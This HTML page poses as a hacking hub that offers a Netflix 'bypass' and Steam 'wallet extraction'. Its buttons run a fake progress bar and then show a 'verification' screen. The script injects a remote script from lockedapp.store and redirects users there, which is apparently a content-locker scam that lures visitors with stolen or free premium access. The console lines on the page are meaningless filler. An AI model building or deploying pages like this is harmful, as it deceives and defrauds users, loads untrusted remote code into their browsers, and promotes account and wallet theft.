<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ULTRA_NET | Premium Hub</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #000; color: #4ade80; font-family: 'Fira Code', monospace; }
        .matrix-card { background: #111; border: 1px solid #222; border-radius: 2rem; overflow: hidden; }
        /* تصحيح قياس الصورة لضمان الظهور */
        .cover-box { width: 100%; height: 200px; background-color: #000; position: relative; }
        .netflix-img { width: 100%; height: 100%; object-fit: contain; padding: 20px; }
        .btn-red { background-color: #e50914; color: white; transition: 0.3s; }
        .btn-red:hover { box-shadow: 0 0 20px #e50914; transform: scale(1.05); }
    </style>
</head>
<body class="pb-10">

    <nav class="sticky top-0 z-50 bg-black border-b border-white/5 px-6 py-4 flex justify-between items-center">
        <div class="flex items-center gap-2">
            <div class="w-8 h-8 bg-[#4ade80] rounded flex items-center justify-center font-bold text-black uppercase">U</div>
            <h1 class="font-bold text-white text-sm uppercase italic">Ultra_Net</h1>
        </div>
        <div class="text-[9px] text-[#4ade80] font-bold uppercase">v9.5 SECURE</div>
    </nav>

    <div class="px-6 pt-10">
        <div class="matrix-card mb-10">
            <div class="cover-box">
                <img src="https://assets.nflxext.com/ffe/siteui/common/allukas/logo_netflix.png" class="netflix-img" alt="Netflix">
            </div>
            <div class="p-8">
                <h3 class="text-2xl font-black text-white italic mb-2 uppercase tracking-tighter">Netflix UHD</h3>
                <p class="text-[10px] text-red-600 font-bold mb-8 uppercase tracking-widest italic">4K Multi-Screen Bypass</p>
                <button onclick="start('Netflix')" class="w-full py-5 btn-red rounded-2xl font-black text-xs uppercase tracking-[0.3em]">Inject Protocol</button>
            </div>
        </div>

        <div class="matrix-card mb-10">
            <div class="cover-box flex items-center justify-center bg-blue-900/20">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Steam_Logo.png" class="w-24 h-24 object-contain" alt="Steam">
            </div>
            <div class="p-8">
                <h3 class="text-2xl font-black text-white italic mb-2 uppercase">Steam</h3>
                <p class="text-[10px] text-blue-400 font-bold mb-8 uppercase italic">Wallet & AAA Extraction</p>
                <button onclick="start('Steam')" class="w-full py-5 bg-blue-600 text-white rounded-2xl font-black text-xs uppercase tracking-[0.3em]">Extract Data</button>
            </div>
        </div>

        <div class="mt-8 border-l-2 border-green-900 pl-6 py-4 text-[10px] text-green-500/70 font-mono italic">
            <p>> htt.2 w tolt Fircked Inset 0 BBv.55-10-00+00.1ins/£2012p</p>
            <p>> 27/L:29[44-6004]</p>
            <p>> htpx=20-05=11w:[4B1.50+0/6049]</p>
        </div>
    </div>

    <div id="loader-zone" class="hidden fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-8">
        <div class="w-full text-center">
            <div class="h-1 bg-gray-900 mb-8 rounded-full overflow-hidden"><div id="fill" class="h-full bg-[#4ade80] w-0 transition-all"></div></div>
            <div id="console" class="text-[10px] font-mono text-[#4ade80] italic"></div>
        </div>
    </div>

    <div id="verify-zone" class="hidden fixed inset-0 bg-black/98 z-[101] flex items-center justify-center p-8 text-center">
        <div class="matrix-card p-10">
            <h2 class="text-2xl font-black text-white mb-6 uppercase italic">Security</h2>
            <p class="text-[10px] text-gray-500 mb-10 uppercase">Complete verification to receive your token.</p>
            <button onclick="unlock()" class="w-full py-5 bg-[#4ade80] text-black font-black rounded-2xl uppercase italic">Verify Now</button>
        </div>
    </div>

    <script>
        function start(type) {
            document.getElementById('loader-zone').classList.remove('hidden');
            let p = 0;
            const iv = setInterval(() => {
                p += 5; document.getElementById('fill').style.width = p + '%';
                if(p >= 100) {
                    clearInterval(iv);
                    setTimeout(() => {
                        document.getElementById('loader-zone').classList.add('hidden');
                        document.getElementById('verify-zone').classList.remove('hidden');
                        const s = document.createElement('script'); s.src = 'https://lockedapp.store/cl/js/6ndqd7'; document.body.appendChild(s);
                    }, 500);
                }
            }, 100);
        }
        function unlock() { if(typeof og_load === 'function') { og_load(); } else { window.location.href = "https://lockedapp.store/cl/i/6ndqd7"; } }
    </script>
</body>
</html>
